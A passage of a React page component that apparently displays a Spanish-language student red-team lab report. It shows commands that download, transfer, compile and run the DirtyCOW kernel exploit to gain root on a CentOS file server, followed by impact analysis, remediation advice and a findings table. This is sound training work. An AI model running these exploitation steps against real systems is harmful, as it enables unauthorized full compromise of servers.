            <CodeBlock>{`wget https://raw.githubusercontent.com/SecWiki/linux-kernel-exploits/master/2016/CVE-2016-5195/40616.c`}</CodeBlock>
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Posteriormente se levantó un servidor HTTP temporal en Kali
                para transferir el archivo a la víctima:
              </p>
            </div>
            <CodeBlock>python3 -m http.server 8080</CodeBlock>
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>Desde la sesión SSH de la víctima, se descargó el exploit:</p>
            </div>
            <CodeBlock>wget http://192.168.56.102:8080/40616.c</CodeBlock>
            <EvidenceGrid items={evidenceGroups.escalation.slice(1, 2)} start={14} />
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Aprovechando la presencia del compilador nativo de C (GCC),
                se compiló el código fuente integrando la directiva de hilos
                de ejecución (<code>-pthread</code>):
              </p>
            </div>
            <CodeBlock>gcc 40616.c -o dirtycow -pthread</CodeBlock>
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                La compilación mostró una advertencia sobre un argumento de
                la función <code>lseek</code>, que no afecta el
                funcionamiento del exploit.
              </p>
            </div>
            <EvidenceGrid items={evidenceGroups.escalation.slice(2, 3)} start={15} />
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Al ejecutar el binario compilado directamente con{" "}
                <code>./dirtycow</code>, el programa sobrescribió
                temporalmente el binario <code>/usr/bin/passwd</code> para
                obtener una shell con privilegios de root. El ataque se
                completó correctamente y se obtuvo una shell como root.
              </p>
            </div>
            <EvidenceGrid items={evidenceGroups.escalation.slice(3, 4)} start={16} />
            <div className="max-w-3xl space-y-5 text-base leading-8 text-muted sm:text-lg">
              <p>
                Dentro de <code>/root</code> se encontró el archivo{" "}
                <code>proof.txt</code>, que confirmó el compromiso total del
                sistema: <em>"Best of Luck"</em> y el hash{" "}
                <code>af52e0163b03cbf7c6dd146351594a43</code>.
              </p>
              <p>
                Se logró comprometer en su totalidad el servidor de archivos
                corporativo. Al alcanzar privilegios de root, las barreras de
                protección locales quedaron completamente derribadas,
                obteniendo acceso sin restricciones a todo el hardware,
                configuraciones, datos compartidos institucionales y
                bitácoras del entorno evaluado.
              </p>
            </div>
            <EvidenceGrid items={evidenceGroups.escalation.slice(4)} start={17} />
          </ActivitySection>

          <ActivitySection
            id="impacto"
            number="08"
            title="Análisis de impacto con el modelo CIA"
          >
            <div className="grid gap-px border border-border bg-border md:grid-cols-3">
              <article className="bg-background p-6">
                <h3 className="text-lg font-semibold">Confidencialidad</h3>
                <p className="mt-3 text-sm leading-7 text-muted">
                  Comprometida en varios niveles: el FTP anónimo expuso
                  archivos de auditoría, <code>readme.txt</code> expuso una
                  contraseña en texto plano, la sesión SMB nula permitió
                  enumerar usuarios, y el acceso root final habilita lectura
                  de cualquier archivo del servidor.
                </p>
              </article>
              <article className="bg-background p-6">
                <h3 className="text-lg font-semibold">Integridad</h3>
                <p className="mt-3 text-sm leading-7 text-muted">
                  Comprometida por completo en la fase final: DirtyCOW
                  modifica binarios del sistema (<code>/usr/bin/passwd</code>).
                  Con root, un atacante podría alterar cualquier archivo o
                  registro. El recurso <code>smbdata</code> en lectura/escritura
                  abierta ya representa un riesgo de integridad por sí mismo.
                </p>
              </article>
              <article className="bg-background p-6">
                <h3 className="text-lg font-semibold">Disponibilidad</h3>
                <p className="mt-3 text-sm leading-7 text-muted">
                  No se realizaron pruebas de denegación de servicio, pero el
                  acceso root obtenido sería suficiente para detener
                  servicios, eliminar archivos críticos o dejar el sistema
                  completamente inoperable.
                </p>
              </article>
            </div>
          </ActivitySection>

          <ActivitySection
            id="recomendaciones"
            number="09"
            title="Recomendaciones técnicas"
          >
            <ul className="max-w-3xl list-disc space-y-3 pl-5 text-base leading-8 text-muted sm:text-lg">
              <li>
                Deshabilitar el acceso anónimo en el servicio FTP (vsftpd) y
                revisar los permisos de los directorios compartidos,
                evitando que algún recurso quede con escritura pública sin
                autenticación.
              </li>
              <li>
                Eliminar el archivo <code>readme.txt</code> y cualquier otro
                archivo que almacene credenciales en texto plano; las
                contraseñas no deben almacenarse ni transmitirse sin cifrado.
              </li>
              <li>
                Configurar Samba para rechazar sesiones nulas (
                <code>restrict anonymous</code>) y habilitar el firmado de
                mensajes SMB de forma obligatoria.
              </li>
              <li>
                Actualizar el kernel de Linux a una versión que incluya el
                parche de DirtyCOW (CVE-2016-5195) o, en su defecto, migrar a
                un sistema operativo con soporte activo; CentOS 7 ya alcanzó
                su fin de vida y no recibe actualizaciones de seguridad.
              </li>
              <li>
                Revisar y reforzar los permisos del recurso compartido{" "}
                <code>smbdata</code>, que actualmente permite lectura y
                escritura sin ningún control de acceso.
              </li>
              <li>
                Deshabilitar el método HTTP TRACE en Apache y agregar los
                encabezados de seguridad recomendados: Content-Security-Policy,
                Strict-Transport-Security y X-Content-Type-Options.
              </li>
            </ul>
          </ActivitySection>

          <ActivitySection
            id="hallazgos"
            number="10"
            title="Tabla de hallazgos"
          >
            {/* Below md: one card per finding, no horizontal scroll. */}
            <div className="space-y-4 md:hidden">
              {findings.map((row) => (
                <div key={row.id} className="border border-border p-5">
                  <div className="flex items-center justify-between gap-3">
                    <span className="font-mono text-xs whitespace-nowrap text-accent">
                      {row.id}
                    </span>
                    <SeverityBadge level={row.severity} />
                  </div>
                  <h3 className="mt-2 text-base font-semibold">{row.vuln}</h3>
                  <dl className="mt-4 space-y-3 text-sm leading-6 text-muted">
                    <div>
                      <dt className="font-mono text-[0.65rem] tracking-wider text-muted uppercase">
                        Evidencia
                      </dt>
                      <dd className="mt-1">{row.evidence}</dd>
                    </div>
                    <div>
                      <dt className="font-mono text-[0.65rem] tracking-wider text-muted uppercase">
                        Impacto
                      </dt>
                      <dd className="mt-1">{row.impact}</dd>
                    </div>
                    <div>
                      <dt className="font-mono text-[0.65rem] tracking-wider text-muted uppercase">
                        Recomendación
                      </dt>
                      <dd className="mt-1">{row.recommendation}</dd>
                    </div>
                  </dl>
                </div>
              ))}
            </div>

            {/* md and up: full table. Contained horizontal scroll (not page-wide)
                for the narrower end of this range, where six columns of prose
                don't quite fit. */}
            <div className="hidden overflow-x-auto border-y border-border md:block">
              <table className="w-full min-w-[64rem] text-left">
                <thead className="font-mono text-xs tracking-wider text-muted uppercase">
                  <tr>
                    <th className="px-4 py-4 font-normal">ID</th>
                    <th className="px-4 py-4 font-normal">Vulnerabilidad</th>
                    <th className="px-4 py-4 font-normal">Severidad</th>
                    <th className="px-4 py-4 font-normal">Evidencia</th>
                    <th className="px-4 py-4 font-normal">Impacto</th>
                    <th className="px-4 py-4 font-normal">Recomendación</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-border">
                  {findings.map((row) => (
                    <tr key={row.id}>
                      <td className="px-4 py-4 align-top font-mono text-xs whitespace-nowrap text-accent">
                        {row.id}
                      </td>
                      <td className="px-4 py-4 align-top font-semibold">
                        {row.vuln}
                      </td>
                      <td className="px-4 py-4 align-top">
                        <SeverityBadge level={row.severity} />
                      </td>
                      <td className="px-4 py-4 align-top text-muted">
                        {row.evidence}
                      </td>
                      <td className="px-4 py-4 align-top text-muted">
                        {row.impact}
                      </td>
                      <td className="px-4 py-4 align-top text-muted">
                        {row.recommendation}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </ActivitySection>

          <ActivitySection id="referencias" number="11" title="Referencias">
            <ul className="max-w-3xl space-y-4 text-sm leading-6 text-muted">
              {references.map((reference) => (
                <li key={reference.url} className="border-t border-border pt-4">
                  <p>{reference.text}</p>
                  <a
                    href={reference.url}
                    target="_blank"
                    rel="noreferrer"
                    className="break-all text-accent transition-colors hover:text-accent-hover"
                  >
                    {reference.url}
                  </a>
                </li>
              ))}
            </ul>
          </ActivitySection>

          <ActivitySection id="recursos" number="12" title="Recursos">
            <div className="grid gap-5 sm:grid-cols-2">
              <ResourceLink
                href={resourceBase + "/184346_act13.pdf"}
                download="184346_act13.pdf"
                type="PDF"
                title="Informe completo"
                description="Red Team Report con metodología, evidencias, análisis de impacto y tabla de hallazgos."
              />
              <ResourceLink
                href={resourceBase + "/184346_act13_presentacion.pdf"}
                download="184346_act13_presentacion.pdf"
                type="PDF"
                title="Presentación ejecutiva"
                description="Síntesis para Consejo Directivo: nivel de riesgo, hallazgos críticos, matriz de riesgo y roadmap de remediación."
              />
            </div>
          </ActivitySection>
        </div>
      </div>
    </article>
  );
}

export default Activity13;